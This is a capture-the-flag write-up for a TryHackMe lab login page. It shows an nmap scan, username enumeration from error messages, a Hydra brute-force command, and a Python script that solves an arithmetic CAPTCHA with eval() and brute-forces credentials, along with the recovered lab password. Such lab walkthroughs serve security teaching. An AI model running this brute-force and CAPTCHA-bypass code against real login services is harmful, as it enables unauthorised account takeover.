---
tags:
  - THM
  - Easy
  - Challenge
  - Brute-Force
  - Scripting
---
https://tryhackme.com/room/capture/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.241.176 capture.thm
```
# Task Files
Download required files:
- `usernames.txt`
- `passwords.txt`
# Scanning
```console
$ nmap -p22,80 -sV -sC capture.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a9:e8:0c:44:e2:74:8d:61:d7:44:e7:bc:4c:0f:0c:64 (RSA)
|   256 e7:e3:da:a2:8f:6f:28:f1:d5:bc:c3:89:33:53:15:06 (ECDSA)
|_  256 da:74:d7:91:28:93:c0:a2:72:7a:51:b6:09:09:ea:09 (ED25519)
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.8.10)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is a login site. After failed log in attempt with username **admin**, the following message is displayed:
```text
Error: The user 'admin' does not exist
```
# Enumeration
Brute-forcing with Hydra shows that almost every user in `usernames.txt` is valid, but when testing manually, they are not:
```console
hydra -L usernames.txt -p password capture.thm http-post-form "/login:username=^USER^&password=^PASS^:F=does not exist"
```
If we manually test any other user, a mathematical operation will appear as a **CAPTCHA**, preventing Hydra's result to be accurate. So, we write a Python script to solve the puzzle and continue brute-forcing:
```python
import re
import requests
from pathlib import Path

session = requests.Session()

def login(username, password, error_message):

    data = {
        "username": username,
        "password": password
    }

    # Make web request
    # session = requests.Session()
    response = session.post('http://capture.thm/login', data=data)

    # Solve captcha if exists
    if "Captcha enabled" in response.text:
        captcha = re.search(r"(\s+)(.*)(\s=\s\?)", response.text).group(2)
        solution = eval(captcha)
        data["captcha"] = solution
        response = session.post('http://capture.thm/login', data=data)

    return not error_message in response.text


def valid_username(username):
    return login(username, 'password', f"The user &#39;{username}&#39; does not exist")


def valid_password(username, password):
    return login(username, password, "Invalid password for user")


if __name__ == '__main__':
    for username in Path('usernames.txt').read_text().splitlines():
        print(f"[*] {username}:password")
        if valid_username(username):
            for password in Path('passwords.txt').read_text().splitlines():
                print(f"[*] {username}:{password}")
                if valid_password(username, password):
                    print(f"[+] {username}:{password}")
                    break
            break
```
Run the script to find **valid credentials**:
```console
$ python3 brute_force.py

[+] natalie:sk8board
```
After log in, we find the **challenge flag**.